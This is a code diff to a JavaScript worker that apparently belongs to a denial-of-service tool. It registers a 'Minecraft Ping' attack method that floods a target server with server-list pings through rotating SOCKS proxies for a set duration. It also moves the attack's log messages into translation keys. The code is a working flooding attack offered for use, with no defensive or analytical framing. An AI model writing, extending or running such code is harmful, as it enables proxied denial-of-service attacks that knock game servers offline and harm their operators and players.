@@ -2,6 +2,13 @@ import { parentPort, workerData } from "worker_threads";
 
 import { pingMinecraftServer } from "../utils/mcUtils.js";
 
+export const info = {
+  id: "minecraft_ping",
+  name: "Minecraft Ping",
+  description: "Spams Minecraft server list pings.",
+  supportedProtocols: ["socks4", "socks5"],
+};
+
 const startAttack = () => {
   const { target, proxies, duration, packetDelay } = workerData;
 
@@ -17,7 +24,7 @@ const startAttack = () => {
 
     if (elapsedTime >= duration) {
       clearInterval(interval);
-      parentPort.postMessage({ log: "Attack finished", totalPackets });
+      parentPort.postMessage({ log: { key: "attack_finished" }, totalPackets });
       process.exit(0);
     }
 
@@ -31,13 +38,27 @@ const startAttack = () => {
         const version = status?.version?.name || "";
         const banner = `${version}: ${players}/${max}`;
         parentPort.postMessage({
-          log: `✅ MC Ping+MOTD Request from ${proxy.protocol}://${proxy.host}:${proxy.port} to ${fixedTarget} (${banner})`,
+          log: {
+            key: "mc_ping_success",
+            params: {
+              proxy: `${proxy.protocol}://${proxy.host}:${proxy.port}`,
+              target: fixedTarget,
+              banner,
+            },
+          },
           totalPackets,
         });
       })
       .catch((e) => {
         parentPort.postMessage({
-          log: `❌ MC Ping+MOTD Request failed from ${proxy.protocol}://${proxy.host}:${proxy.port} to ${fixedTarget}: ${e.message}`,
+          log: {
+            key: "mc_ping_failed",
+            params: {
+              proxy: `${proxy.protocol}://${proxy.host}:${proxy.port}`,
+              target: fixedTarget,
+              error: e.message,
+            },
+          },
           totalPackets,
         });
       });
